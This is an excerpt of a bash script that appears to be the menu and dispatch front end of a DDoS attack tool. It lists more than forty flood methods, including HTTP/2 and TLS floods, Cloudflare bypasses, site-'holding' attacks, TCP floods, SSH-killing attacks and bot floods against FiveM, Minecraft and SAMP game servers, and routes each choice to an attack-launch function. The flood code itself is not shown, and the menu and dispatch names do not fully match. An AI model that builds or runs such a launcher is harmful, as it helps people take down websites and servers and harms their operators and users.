...
show_menu() {
    ...
    echo -e "${WHITE}║${NC}  ${YELLOW}[6]${NC}  h2-zerov2        - HTTP/2 Zero V2 (Enhanced)                   ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[7]${NC}  h2f              - HTTP/2 Flood (Standard)                      ${WHITE}║${NC}"
    ...
    echo -e "${WHITE}║${NC}  ${YELLOW}[10]${NC} http-raw         - RAW GET Flood (Low Bypass)                   ${WHITE}║${NC}"
    ...
    echo -e "${WHITE}║${NC}  ${YELLOW}[14]${NC} ntol2            - NTOL2 Attack (Enhanced)                    ${WHITE}║${NC}"
    ...
    echo -e "${WHITE}║${NC}  ${YELLOW}[19]${NC} static           - HTTP/2 Get (Static Sites Bypass)             ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[20]${NC} tlsv2            - TLS 1.2 Flood Bypass                        ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[21]${NC} vhold            - Method for Holding Sites (Max 10 conc)       ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[22]${NC} vholdv2          - VHold V2 (Enhanced)                         ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[23]${NC} zero             - HTTP/2 Flooder (Ratelimit)                  ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[24]${NC} zero-bypass      - Bypassing All Sites (No Request Capture)    ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[25]${NC} zero-rst         - Zero RST (Cloudflare Custom Rule Bypass)    ${WHITE}║${NC}"
    ...
    echo -e "${WHITE}║${NC}                                                                  ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[31]${NC} tcp              - High PPS TCP Flood (Non-80/443)              ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[32]${NC} tcp-bot          - TCP Bot Attack (Non-80/443)                  ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[33]${NC} tcp-pshack       - TCP PSH + ACK (Non-80/443)                    ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[34]${NC} tcprand          - TCP Random (Non-80/443)                      ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[35]${NC} sshkill          - SSH Kill Attack                              ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[36]${NC} sshkill-bot      - SSH Kill Bot                                 ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[37]${NC} fivem            - FiveM API Attack                              ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[38]${NC} mcbot            - Minecraft Bot Attack (2000+ bots)             ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[39]${NC} samp             - SAMP Random Protocols                        ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[40]${NC} householder      - Home Holder (36000s timelimit)                ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[41]${NC} ovhtcp           - OVH TCP Attack                                ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[42]${NC} std-bot          - Standard Bot Attack                           ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[43]${NC} vse-bot          - VSE Bot Attack                                ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}                                                                  ${WHITE}║${NC}"
    echo -e "${WHITE}╠══════════════════════════════════════════════════════════════════════╣${NC}"
...
get_attack_params() {
    ...
    if [[ "$method" =~ ^(tcp|tcp-bot|tcp-pshack|tcprand|sshkill|sshkill-bot|fivem|mcbot|samp|homeholder|ovhtcp|std-bot|vse-bot)$ ]]; then
...
main() {
    while true; do
        ...
        case $choice in
            ...
            31) get_attack_params "tcp" && launch_l4_attack "tcp" ;;
            32) get_attack_params "tcp-bot" && launch_l4_attack "tcp-bot" ;;
            33) get_attack_params "tcp-pshack" && launch_l4_attack "tcp-pshack" ;;
            34) get_attack_params "tcprand" && launch_l4_attack "tcprand" ;;
            35) get_attack_params "sshkill" && launch_l4_attack "sshkill" ;;
            36) get_attack_params "sshkill-bot" && launch_l4_attack "sshkill-bot" ;;
            37) get_attack_params "fivem" && launch_l4_attack "fivem" ;;
            38) get_attack_params "mcbot" && launch_l4_attack "mcbot" ;;
            39) get_attack_params "samp" && launch_l4_attack "samp" ;;
            40) get_attack_params "homeholder" && launch_l4_attack "homeholder" ;;
            41) get_attack_params "ovhtcp" && launch_l4_attack "ovhtcp" ;;
            42) get_attack_params "std-bot" && launch_l4_attack "std-bot" ;;
            43) get_attack_params "vse-bot" && launch_l4_attack "vse-bot" ;;
